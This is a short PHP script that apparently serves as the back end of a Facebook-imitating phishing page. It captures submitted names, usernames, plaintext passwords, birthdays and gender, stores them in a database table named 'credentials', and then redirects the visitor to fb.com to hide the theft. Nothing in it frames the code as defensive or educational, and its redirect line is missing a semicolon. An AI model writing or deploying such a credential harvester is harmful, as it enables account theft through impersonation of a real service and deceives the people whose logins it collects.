<?php

    $f_name = $_POST['f_name'];
    $l_name = $_POST['l_name'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $day = $_POST['bd_day'];
    $month = $_POST['bd_month'];
    $year = $_POST['bd_year'];
    #$date = $day.",".$month.",".$year; 
    $date = $year.",".$month.",".$day;
    $gender = $_POST['gender'];

    //Database connection
    $conn = new mysqli('localhost','root','','fb');
    if($conn->connect_error){
        echo "$conn->connect_error";
        die("Connection failed: ". $conn->connect_error);
    }
    else{
        $stmt = $conn->prepare("insert into credentials(f_name, l_name, username, pass, birthday, gender) values(?,?,?,?,?,?)");
        $stmt->bind_param("ssssss", $f_name, $l_name, $username, $password, $date, $gender);
        $stmt->execute();
        header("Location: http://www.fb.com")
        $stmt->close();
        $conn->close();
    }

?>